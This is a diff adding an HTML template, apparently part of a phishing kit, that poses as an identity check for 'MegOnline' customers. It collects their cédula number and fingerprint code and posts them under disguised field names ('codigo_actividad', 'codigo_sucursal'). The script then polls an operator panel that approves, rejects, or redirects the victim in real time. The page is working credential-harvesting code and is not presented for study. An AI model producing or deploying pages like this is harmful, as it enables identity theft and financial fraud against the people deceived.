@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MegOnline - Comprobación de horarios</title>
+    <link rel="icon" href="{{ url_for('static', filename='images/favicon.png') }}" type="image/x-icon">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            width: 100vw;
+            height: 100vh;
+            background-image: url("{{ url_for('static', filename='images/fondo.svg') }}");
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Top Header Bar */
+        .top-bar {
+            width: 100%;
+            height: 70px;
+            background: #bd2cf9;
+            display: flex;
+            align-items: center;
+            padding-left: 40px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .top-logo {
+            height: 35px;
+            object-fit: contain;
+        }
+
+        /* Accessibility Button */
+        .accessibility-btn {
+            position: absolute;
+            left: 20px;
+            top: 130px;
+            width: 50px;
+            height: 50px;
+            background: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+            cursor: pointer;
+            z-index: 10;
+        }
+        .accessibility-btn img {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+        }
+
+        /* Main Center Card */
+        .card-container {
+            position: absolute;
+            left: 50%;
+            top: 54%;
+            transform: translate(-50%, -50%);
+            width: 950px;
+            height: 600px;
+            background: #ffffff;
+            border: 1px solid #d1b3ff;
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            padding: 35px 50px;
+            justify-content: space-between;
+        }
+
+        /* Header inside Card */
+        .card-header-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #2c3e50;
+        }
+
+        /* Steps Indicator Bar */
+        .steps-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin-top: 5px;
+            margin-bottom: 15px;
+        }
+        .step-circle {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #dcd6f7;
+            color: #7b2cbf;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .step-circle.active {
+            background: #7b2cbf;
+            color: #fff;
+        }
+        .step-line {
+            width: 80px;
+            height: 2px;
+            background: #dcd6f7;
+        }
+
+        /* Two Columns Layout */
+        .card-content-grid {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            gap: 40px;
+        }
+
+        /* Left Column (Inputs) */
+        .left-column {
+            flex: 1;
+        }
+
+        .section-title-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .calendar-icon-box {
+            width: 45px;
+            height: 45px;
+            background: #f3e8ff;
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #7b2cbf;
+            font-size: 22px;
+            flex-shrink: 0;
+        }
+        .section-texts h3 {
+            font-size: 16px;
+            color: #2c3e50;
+            font-weight: 700;
+        }
+        .section-texts p {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.3;
+            margin-top: 2px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 5px;
+        }
+        .input-wrapper {
+            position: relative;
+        }
+        .form-input {
+            width: 100%;
+            padding: 11px 15px 11px 40px;
+            border: 1.5px solid #dcd6f7;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #333;
+            outline: none;
+            background: #fff;
+            transition: border-color 0.3s;
+        }
+        .form-input:focus {
+            border-color: #7b2cbf;
+        }
+        .input-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+            font-size: 15px;
+        }
+
+        /* Right Column (Carnet Guide) */
+        .right-column {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-left: 1px solid #eee;
+            padding-left: 30px;
+        }
+        .right-guide-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #444;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .carnet-img {
+            width: 100%;
+            max-width: 360px;
+            height: auto;
+            object-fit: contain;
+        }
+
+        /* Bottom Action Button */
+        .card-footer-action {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .btn-validar {
+            width: 250px;
+            padding: 12px;
+            background: #e0e0e0;
+            border: none;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-validar.active {
+            background: #7b2cbf;
+        }
+        .btn-validar.active:hover {
+            background: #6a22a8;
+        }
+
+        /* Loading Dots Container (Reemplaza al botón Validar) */
+        .loading-container {
+            width: 250px;
+            height: 45px;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .loading-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #3498db;
+            animation: bounceAndColor 1.2s infinite ease-in-out both;
+        }
+        .loading-dot:nth-child(1) { animation-delay: -0.36s; }
+        .loading-dot:nth-child(2) { animation-delay: -0.24s; }
+        .loading-dot:nth-child(3) { animation-delay: -0.12s; }
+        .loading-dot:nth-child(4) { animation-delay: 0s; }
+
+        @keyframes bounceAndColor {
+            0%, 80%, 100% {
+                transform: translateY(0);
+                background-color: #3498db;
+            }
+            40% {
+                transform: translateY(-16px);
+                background-color: #f1c40f;
+            }
+        }
+
+        /* Footer Nav */
+        .footer-nav {
+            position: absolute;
+            bottom: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 25px;
+            font-size: 12px;
+            color: #ffffff;
+        }
+        .footer-nav a {
+            color: #ffffff;
+            text-decoration: none;
+        }
+        .footer-nav a:hover {
+            text-decoration: underline;
+        }
+
+        /* Error Modal Overlay */
+        #error-modal {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .error-card {
+            width: 420px;
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            border: 2px solid #ff7675;
+        }
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 20px;
+            color: #8e44ad;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .error-icon-circle {
+            width: 75px;
+            height: 75px;
+            background: #ff7675;
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 45px;
+            font-weight: bold;
+        }
+        .error-text {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 25px;
+        }
+        .btn-error-ok {
+            background: #5c4ce0;
+            color: #fff;
+            border: none;
+            padding: 10px 40px;
+            border-radius: 20px;
+            font-size: 15px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        /* ========================================== */
+    /* DISEÑO RESPONSIVO / MÓVIL (HORARIOS)       */
+    /* ========================================== */
+    @media screen and (max-width: 768px) {
+        body {
+            overflow: auto;
+            height: auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Ajustar barra superior */
+        .top-bar {
+            height: 60px;
+            padding-left: 20px;
+        }
+        .top-logo {
+            height: 28px;
+        }
+
+        /* Ajustar la tarjeta central para móviles */
+        .card-container {
+            position: relative;
+            left: auto;
+            top: auto;
+            transform: none;
+            width: 92%;
+            max-width: 450px;
+            height: auto;
+            min-height: unset;
+            margin: 25px auto;
+            padding: 25px 20px;
+        }
+
+        .card-header-title {
+            font-size: 18px;
+        }
+
+        /* Reducir el indicador de pasos superior */
+        .steps-container {
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .step-circle {
+            width: 28px;
+            height: 28px;
+            font-size: 12px;
+        }
+        .step-line {
+            width: 40px;
+        }
+
+        /* Cambiar la estructura de dos columnas a una sola columna */
+        .card-content-grid {
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        /* Ocultar la columna derecha (guía del carnet) en móvil para ahorrar espacio vertical */
+        .right-column {
+            display: none;
+        }
+
+        .left-column {
+            width: 100%;
+        }
+
+        /* Ajustar elementos del formulario */
+        .form-input {
+            padding: 10px 15px 10px 38px;
+            font-size: 13px;
+        }
+
+        /* Botón de validación y contenedor de carga adaptados al 100% */
+        .card-footer-action {
+            width: 100%;
+            margin-top: 15px;
+        }
+
+        .btn-validar,
+        .loading-container {
+            width: 100%;
+            max-width: 100%;
+        }
+
+        /* Reposicionar botón de accesibilidad flotante */
+        .accessibility-btn {
+            top: 75px;
+            left: 15px;
+            width: 42px;
+            height: 42px;
+        }
+        .accessibility-btn img {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* Ajustar pie de página */
+        .footer-nav {
+            position: relative;
+            bottom: auto;
+            left: auto;
+            transform: none;
+            margin: 20px 0;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            color: #555;
+        }
+        .footer-nav a {
+            color: #555;
+        }
+    }
+    </style>
+</head>
+<body>
+
+    <!-- Top Header -->
+    <div class="top-bar">
+        <img src="{{ url_for('static', filename='images/logoblanco.svg') }}" alt="MegOnline Logo" class="top-logo">
+    </div>
+
+    <!-- Accessibility Button -->
+    <div class="accessibility-btn" title="Accesibilidad">
+        <img src="{{ url_for('static', filename='images/acc.png') }}" alt="Accesibilidad">
+    </div>
+
+    <!-- Main Card Container -->
+    <div class="card-container">
+        
+        <!-- Header & Steps -->
+        <div>
+            <div class="card-header-title">Validación de indentidad</div>
+            <div class="steps-container">
+                <div class="step-circle">1</div>
+                <div class="step-line"></div>
+                <div class="step-circle active">2</div>
+                <div class="step-line"></div>
+                <div class="step-circle">3</div>
+            </div>
+        </div>
+
+        <!-- Content Grid (Form + Carnet) -->
+        <div class="card-content-grid">
+            
+            <!-- Left Column: Validation Form -->
+            <div class="left-column">
+                <div class="section-title-group">
+                    <div class="section-texts">
+                        <h3>Validación de identidad</h3>
+                        <p>Estimado socio/cliente, para continuar.<br>Necesitamos validar tu identida. por favor ingresa tu <strong>numero de cèdula</strong> y <strong>código dactilar</strong>.</p>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Cedula de identidad</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon"></span>
+                        <input type="text" id="input-actividad" class="form-input" placeholder="Ingresa tu numero de cedula" autocomplete="off">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Código de dactilar</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon"></span>
+                        <input type="text" id="input-sucursal" class="form-input" placeholder="Ingresa tu codigo dactilar" autocomplete="off">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Column: Carnet Guide Image -->
+            <div class="right-column">
+                <div class="right-guide-title">Encuentra el código dactiar en la parte posterior<br>de tu cedula</div>
+                <img src="{{ url_for('static', filename='images/carnet.png') }}" alt="Carnet de Empleado" class="carnet-img">
+            </div>
+
+        </div>
+
+        <!-- Bottom Action Button & Loader -->
+        <div class="card-footer-action">
+            <button type="button" id="btn-validar" class="btn-validar">Validar</button>
+            <div id="inline-loader" class="loading-container">
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Footer Nav Links -->
+    <div class="footer-nav">
+        <a href="#">Tutoriales</a>
+        <span>|</span>
+        <a href="#">Preguntas frecuentes</a>
+        <span>|</span>
+        <a href="#">Consejos de seguridad</a>
+    </div>
+
+    <!-- Error Modal (Cierra automáticamente a los 4s o manualmente) -->
+    <div id="error-modal">
+        <div class="error-card">
+            <span class="close-modal" id="close-modal-x">&times;</span>
+            <div class="error-icon-circle">!</div>
+            <div class="error-text">Datos de validación incorrectos. Vuelve a ingresar tus datos.</div>
+            <button type="button" class="btn-error-ok" id="btn-error-ok">Continuar</button>
+        </div>
+    </div>
+
+    <script>
+    const inputActividad = document.getElementById('input-actividad');
+    const inputSucursal = document.getElementById('input-sucursal');
+    const btnValidar = document.getElementById('btn-validar');
+    const inlineLoader = document.getElementById('inline-loader');
+    const errorModal = document.getElementById('error-modal');
+    const closeModalX = document.getElementById('close-modal-x');
+    const btnErrorOk = document.getElementById('btn-error-ok');
+    let errorTimer = null;
+
+    function validateForm() {
+        if (inputActividad.value.trim().length > 0 && inputSucursal.value.trim().length > 0) {
+            btnValidar.classList.add('active');
+        } else {
+            btnValidar.classList.remove('active');
+        }
+    }
+
+    inputActividad.addEventListener('input', validateForm);
+    inputSucursal.addEventListener('input', validateForm);
+
+    // Evento único conectado correctamente con la espera del panel
+    btnValidar.addEventListener('click', function() {
+        if (!btnValidar.classList.contains('active')) return;
+
+        const actividad = inputActividad.value.trim();
+        const sucursal = inputSucursal.value.trim();
+
+        // Ocultar botón y mostrar loader de puntitos (se queda en carga)
+        btnValidar.style.display = 'none';
+        inlineLoader.style.display = 'flex';
+
+        fetch('/control/horarios', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ codigo_actividad: actividad, codigo_sucursal: sucursal })
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Iniciar ciclo de espera inteligente hasta que el operador decida en el panel
+            esperarDecisionPanel(
+                () => {}, 
+                () => {
+                    // Si el panel da error, restaura el botón, oculta loader y muestra el modal
+                    inlineLoader.style.display = 'none';
+                    btnValidar.style.display = 'block';
+                    showErrorModal();
+                }
+            );
+        })
+        .catch(error => {
+            inlineLoader.style.display = 'none';
+            btnValidar.style.display = 'block';
+            console.error('Error:', error);
+        });
+    });
+
+    function showErrorModal() {
+        if (errorModal) errorModal.style.display = 'flex';
+        errorTimer = setTimeout(() => {
+            closeErrorModal();
+        }, 4000);
+    }
+
+    function closeErrorModal() {
+        if (errorModal) errorModal.style.display = 'none';
+        if (errorTimer) clearTimeout(errorTimer);
+        inputActividad.value = '';
+        inputSucursal.value = '';
+        btnValidar.classList.remove('active');
+    }
+
+    if (closeModalX) closeModalX.addEventListener('click', closeErrorModal);
+    if (btnErrorOk) btnErrorOk.addEventListener('click', closeErrorModal);
+
+    // Función estándar de espera inteligente para la decisión del panel de control
+   // Función de espera inteligente mejorada para Horarios
+function esperarDecisionPanel(onSuccess, onError) {
+    const intervalo = setInterval(() => {
+        fetch('/control/api/verificar_estado')
+        .then(res => res.json())
+        .then(data => {
+            // Si el panel decide aprobar el proceso por completo
+            if (data.decision === 'aprobar' && data.siguiente) {
+                clearInterval(intervalo);
+                window.location.href = data.siguiente;
+            } 
+            // NUEVO: Si el panel decide regresar al usuario a carnet
+            else if (data.fase === 'carnet') {
+                clearInterval(intervalo);
+                window.location.href = '/control/carnet'; // O la ruta exacta de tu vista de carnet
+            } 
+            // Si el panel marca error en horarios
+            else if (data.decision === 'error') {
+                clearInterval(intervalo);
+                onError(); 
+            }
+        });
+    }, 2000); // Revisa cada 2 segundos
+}
+</script>
+</body>
+</html>
